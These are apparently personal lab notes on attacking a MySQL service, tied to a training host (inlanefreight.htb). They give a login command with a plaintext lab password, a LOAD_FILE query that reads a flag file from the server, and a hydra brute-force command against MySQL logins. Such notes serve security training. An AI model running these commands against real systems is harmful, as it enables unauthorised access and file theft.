port: 3306


|  Commands | Description  |
|---|---|
|`mysql -u <user> -p<password> -h <FQDN/IP>`|Login to the MySQL server.|

### Load system files

```mysql
select LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```

### Connect to server

mysql -u fiona@inlanefreight.htb -p987654321 -h 10.129.187.61

### Brute force mysql
```shell
hydra -l fiona@inlanefreight.htb -P ./pws.list -f 10.129.5.123 mysql
```
